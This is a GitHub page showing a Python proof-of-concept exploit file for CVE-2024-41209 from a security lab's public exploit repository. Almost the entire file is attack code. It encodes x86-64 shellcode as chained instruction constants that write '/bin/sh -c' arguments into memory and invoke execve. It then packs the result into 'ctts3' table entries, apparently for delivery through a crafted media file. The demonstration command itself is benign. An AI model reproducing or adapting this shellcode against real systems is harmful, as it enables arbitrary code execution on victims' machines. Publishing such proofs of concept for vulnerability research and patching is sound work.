  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_shellcode.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RICSecLab%2Fexploit-poc-public)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RICSecLab](/RICSecLab)
/
**[exploit-poc-public](/RICSecLab/exploit-poc-public)**
Public

* [Notifications](/login?return_to=%2FRICSecLab%2Fexploit-poc-public) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)
* [Star
   20](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)

* [Code](/RICSecLab/exploit-poc-public)
* [Issues
  0](/RICSecLab/exploit-poc-public/issues)
* [Pull requests
  0](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects
  0](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

Additional navigation options

* [Code](/RICSecLab/exploit-poc-public)
* [Issues](/RICSecLab/exploit-poc-public/issues)
* [Pull requests](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

## Files

 main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_shellcode.py

Copy path Blame  Blame
## Latest commit

## History

[History](/RICSecLab/exploit-poc-public/commits/main/CVE-2024-41209/exploit_shellcode.py)92 lines (83 loc) · 2.55 KB main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_shellcode.py

Top
## File metadata and controls

* Code
* Blame

92 lines (83 loc) · 2.55 KB[Raw](https://github.com/RICSecLab/exploit-poc-public/raw/refs/heads/main/CVE-2024-41209/exploit_shellcode.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python3from ptrlib import \*
addr\_arg0 = 0x900ed0 - 0x100addr\_arg1 = 0x900ed0 - 0x100 + 0x10addr\_arg2 = 0x900ed0 - 0x100 + 0x20addr\_args = 0x900ed0 - 0x100 - 0x20
def craft\_write(addr, val): return [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 # 0xb990000c | (((addr >> 24) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # mov bl, XX 0xb99000b3 | (val << 8), # mov [rax], bl 0xb9901888 ]
def craft\_string(addr, s): out = [] for i, c in enumerate(s): out += craft\_write(addr + i, c) return out
shellcode = []shellcode += craft\_string(addr\_arg0, b'/bin/sh\0')shellcode += craft\_string(addr\_arg1, b'-c\0')shellcode += craft\_string(addr\_arg2, b'ls -lha; id; date\0')for i in range(3): shellcode += craft\_write(addr\_args+i, (addr\_arg0 >> (i\*8)) & 0xff)for i in range(3): shellcode += craft\_write(addr\_args+8+i, (addr\_arg1 >> (i\*8)) & 0xff)for i in range(3): shellcode += craft\_write(addr\_args+0x10+i, (addr\_arg2 >> (i\*8)) & 0xff)addr = addr\_args+0x18shellcode += [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # xor ebx, ebx 0xb990db31, # mov [rax], rbx 0xb9188948]
# Set rsiaddr = addr\_argsshellcode += [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # mov esi, eax 0xb990c689,]
# Set rdiaddr = addr\_arg0shellcode += [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # mov edi, eax 0xb990c789,]
shellcode += [ 'xor edx, edx', 'xor eax, eax', 'mov al, 59', 'syscall',]
def convert(b): assert len(b) < 4 return u32(b + b'\x90'\*(3 - len(b)) + b'\xb9')
ctts3\_entries = []for i in range(0, len(shellcode), 2): ctts3\_entries.append([ shellcode[i] if isinstance(shellcode[i], int) else convert(assemble(shellcode[i])), shellcode[i+1] if isinstance(shellcode[i+1], int) else convert(assemble(shellcode[i+1])) ])

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


